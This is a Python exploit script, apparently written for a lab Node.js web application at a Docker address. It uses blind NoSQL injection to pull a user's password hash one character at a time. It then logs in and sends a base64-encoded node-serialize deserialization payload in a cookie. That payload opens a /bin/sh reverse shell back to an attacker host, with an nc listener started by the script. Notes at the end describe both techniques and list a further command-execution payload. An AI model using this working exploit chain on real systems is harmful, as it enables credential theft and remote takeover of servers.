#!/usr/bin/python3

import requests
import urllib3
import logging
import sys
from time import sleep
import string
import  concurrent.futures
import  sys
from itertools import repeat
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import subprocess
import base64
import urllib.parse

http_proxy = "http://127.0.0.1:8080"
proxyDict = {"http":http_proxy}


# Define Functions
## Used for NodeJS Reverse Shell.
def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

def type_print(output):
    for x in output:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.04)
    sleep(1)


def enum_row_values(index):
    # SHA256 only has lowercase characters and digits.  If you include all printable characters, it has characters that error out the NoSQL statement.
    list_iterator = list(string.ascii_lowercase + string.digits)
    # The substring method for NoSQL grabs the character value BETWEEN the start and the end value.
    index_plus = index + 1

    for printableCharacter in list_iterator:
        payload = {'username': f'john\' && this.password.substring({index},{index_plus}) == \'{printableCharacter}','password': 'test2'}
        response = session.post('http://172.17.0.2:3000/register', data=payload, proxies=proxyDict, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})

        if int(response.status_code) == 200:
            #print(f"{printableCharacter}")
            return str(printableCharacter)
            break


def display_password_hash():
    ## Find the character length of the table being looped on.
    value_char_length = 64

    ## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
    with concurrent.futures.ThreadPoolExecutor() as executor:
        ## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
        row_value_letters = executor.map(enum_row_values, list(range(0,value_char_length)))

    ## Dipslay the name of the table being looped.
    row_value_name = ''
    try:
        for letter in row_value_letters:
            row_value_name += letter
    except:
        pass
    #print(f"{row_value_name}")
    return row_value_name

# 1. Establish Session
type_print('1. Establishing Session.\n\n')

session = requests.Session()

# 1. Send a Test HTTP Request to web root.
response = session.get('http://172.17.0.2:3000/')

if int(response.status_code) == 200:
    type_print("1. Web root accessible.\n\n")
else:
    type_print("1. Web adddress not accessible.")
    type_print(str(response.status_code) + "\n\n")
    sys.exit("...Exiting")

# 2. Testing NoSQLi
type_print("2. NoSQL Injection - Grabbing password hash for user John.  Please wait ~1 minute.\n")

password = display_password_hash()
type_print(f'2. John\'s Password hash is: {password}\n')

# 3. Login
type_print("3. Logging in as John.")

# Logging in 3 times as it seems the deserialization exploit doesn't work unless you log into an account two or three times - not the first time.
response = session.post('http://172.17.0.2:3000/auth', data={'username':'john','password':'john'}, proxies=proxyDict)
response = session.post('http://172.17.0.2:3000/auth', data={'username':'john','password':'john'}, proxies=proxyDict)
response = session.post('http://172.17.0.2:3000/auth', data={'username':'john','password':'john'}, proxies=proxyDict)

if response.status_code == 200:
    type_print(" Login successful.\n")
else:
    type_print(" Login failed.\n")
    sys.exit("...Exiting")

# 4. Node Deserialization
type_print("4. Executing Node Deserialization Reverse Shell.")

NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="172.17.0.1";
PORT="9001";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
'''
payload = charencode(NODEJS_REV_SHELL)

payload = '{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(%s))} ()"}' % payload
payload = (base64.b64encode(payload.encode('ascii')).decode('ascii'))

type_print(' Opening a reverse shell.\n')
subprocess.Popen(["nc","-nvlp","9001"])
sleep(3)
response = session.get('http://172.17.0.2:3000/', proxies=proxyDict, cookies=dict(draft=payload))

# Used to keep the shell open in the terminal unitl you pass a ^C to cancel the script.
while True:
    pass


## TO-DO: Below payload needs to be base64 encoded and assigned to a cookie variable of draft in a GET to the root directory.
### {"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c 2 176.17.0.1', function(error, stdout, stderr) { console.log(stdout) });\n }()"}

# NOTES
## NoSQL Blind SQLi - NodeJS.
### Look for componetns where user input is passed to a SQL-like query - potentially with a $where clause for a query.
#### var query = {$where: `this.username == '${username}'`};
### You need to use a substring method to get each charater returned.  The substring method defines a start character and an end character (different from SQL like Postgres).

## NodeJS Deserialization Reverse Shell
### Note that deserialization of a reverse shell payload doesn't seem to work unless you re-login a couple of times.
### The charencode function and lines 113 - 140 are what is necessary to generate a NodeJS reverse shell payload for the HOST and PORT in the NODEJS_REV_SHELL variable.
### Look for areas in the code where user input goes through an 'unserialize' method.